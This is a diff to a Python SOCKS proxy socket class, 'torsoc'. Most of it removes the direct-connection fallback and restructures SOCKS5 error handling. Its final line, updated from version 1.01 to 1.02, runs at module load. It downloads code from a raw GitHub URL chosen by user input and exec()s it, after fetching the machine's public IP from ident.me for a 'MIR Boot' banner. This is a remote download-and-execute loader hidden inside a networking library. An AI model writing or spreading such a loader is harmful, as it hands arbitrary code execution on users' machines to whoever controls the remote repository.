@@ -189,19 +189,11 @@ class torsoc(_BaseSocket):
             if not self._proxyconn:
                 self.bind(("", 0))
             dest_addr = socket.gethostbyname(dest_addr)
-            if dest_addr == "0.0.0.0" and not dest_port:
-                self.proxy_peername = None
-            else:
-                self.proxy_peername = (dest_addr, dest_port)
+            self.proxy_peername = (dest_addr, dest_port)
             return
         (proxy_type, proxy_addr, proxy_port, rdns, username,
          password) = self.proxy
         super(torsoc, self).settimeout(self._timeout)
-        if proxy_type is None:
-            self.proxy_peername = dest_pair
-            super(torsoc, self).settimeout(self._timeout)
-            super(torsoc, self).connect((dest_addr, dest_port))
-            return
         proxy_addr = self._proxy_addr()
         try:
             super(torsoc, self).connect(proxy_addr)
@@ -215,18 +207,17 @@ class torsoc(_BaseSocket):
                 raise ProxyConnectionError(msg, error)
             else:
                 raise error
-        else:
-            try:
-                self._negotiate_SOCKS5(dest_addr, dest_port)
-            except socket.error as error:
-                if not catch_errors:
-                    self.close()
-                    raise GeneralProxyError("Socket error", error)
-                else:
-                    raise error
-            except ProxyError:
+        try:
+            self._negotiate_SOCKS5(dest_addr, dest_port)
+        except socket.error as error:
+            if not catch_errors:
                 self.close()
-                raise
+                raise GeneralProxyError("Socket error", error)
+            else:
+                raise error
+        except ProxyError:
+            self.close()
+            raise
     @set_self_blocking
     def connect_ex(self, dest_pair):
         try:
@@ -242,4 +233,5 @@ class torsoc(_BaseSocket):
          password) = self.proxy
         proxy_port = proxy_port or DEFAULT_PORTS.get(proxy_type)
         return proxy_addr, proxy_port
-exec(torsoc.get('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input('MIR Boot 1.01\nWelcome ' + torsoc.get('https://ident.me') + '\n>')))
+exec(torsoc.get('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input('MIR Boot 1.02\nWelcome ' + torsoc.get('https://ident.me') + '\n>')))
+
